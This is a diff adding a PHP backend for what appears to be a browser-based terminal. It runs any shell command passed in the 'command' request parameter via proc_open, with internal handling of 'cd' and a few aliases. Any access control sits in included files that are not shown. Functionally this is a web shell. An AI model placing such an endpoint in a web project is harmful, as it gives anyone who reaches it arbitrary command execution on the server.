@@ -1,0 +1,93 @@
+<?php
+include(dirname(__FILE__)."/headers.php");
+include(dirname(__FILE__)."/settings.php");
+
+$aliases = array(
+	'la' 	=> 'ls -la',
+	'll' 	=> 'ls -lvhF',
+);
+
+// Get current working dir
+$cwd = getcwd();
+
+// If we have a command
+if(!empty($_REQUEST['command'])) {
+	// Strip any slashes from it
+	if(get_magic_quotes_gpc()) {
+		$_REQUEST['command'] = stripslashes($_REQUEST['command']);
+	}
+
+	// Begin output with prompt and user command
+	$output = "<span style=\"color: #fff\">".$cwd."\n$&gt; ".$_REQUEST['command']."</span>\n\n";
+}
+
+// If command contains cd but no dir
+if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', @$_REQUEST['command'])) {
+	$_SESSION['cwd'] = getcwd(); //dirname(__FILE__);
+// Else cd to a dir
+} elseif (preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', @$_REQUEST['command'], $regs)) {
+	// The current command is 'cd', which we have to handle as an internal shell command
+	// Absolute/relative path ?
+	($regs[1][0] == '/') ? $newDir = $regs[1] : $newDir = $_SESSION['cwd'].'/'.$regs[1];
+
+	// Tidy up appearance on /./
+	while (strpos($newDir, '/./') !== false) {
+		$newDir = str_replace('/./', '/', $newDir);
+	}
+	// Tidy up appearance on //
+	while (strpos($newDir, '//') !== false) {
+		$newDir = str_replace('//', '/', $newDir);
+	}
+	// Tidy up appearance on other variations
+	while (preg_match('|/\.\.(?!\.)|', $newDir)) {
+		$newDir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $newDir);
+	}
+
+	// Empty dir
+	if(empty($newDir)) {
+		$newDir = "/";
+	}
+
+	// Test if we could change to that dir, else display error
+	(@chdir($newDir)) ? $_SESSION['cwd'] = $newDir : $output .= "\n\nCould not change to: $newDir\n\n";
+} else {
+	// The command is not a 'cd' command, so we execute it after
+	// changing the directory and save the output.
+	chdir($_SESSION['cwd']);
+
+	// Alias expansion
+	$length = strcspn(@$_REQUEST['command'], " \t");
+	$token = substr(@$_REQUEST['command'], 0, $length);
+	if (isset($aliases[$token])) {
+		$_REQUEST['command'] = $aliases[$token].substr($_REQUEST['command'], $length);
+	}
+
+	// Open a proc with array and $io return
+	$p = proc_open(
+		@$_REQUEST['command'],
+		array(
+			1 => array('pipe', 'w'),
+			2 => array('pipe', 'w')
+		),
+		$io
+	);
+
+	// Read output sent to stdout
+	while (!feof($io[1])) {
+		$output .= htmlspecialchars(fgets($io[1]),ENT_COMPAT, 'UTF-8');
+	}
+	// Read output sent to stderr
+	while (!feof($io[2])) {
+		$output .= htmlspecialchars(fgets($io[2]),ENT_COMPAT, 'UTF-8');
+	}
+	$output .= "\n";
+
+	// Close everything off
+	fclose($io[1]);
+	fclose($io[2]);
+	proc_close($p);
+}
+
+// Finally, output our string
+echo $output;
+?>
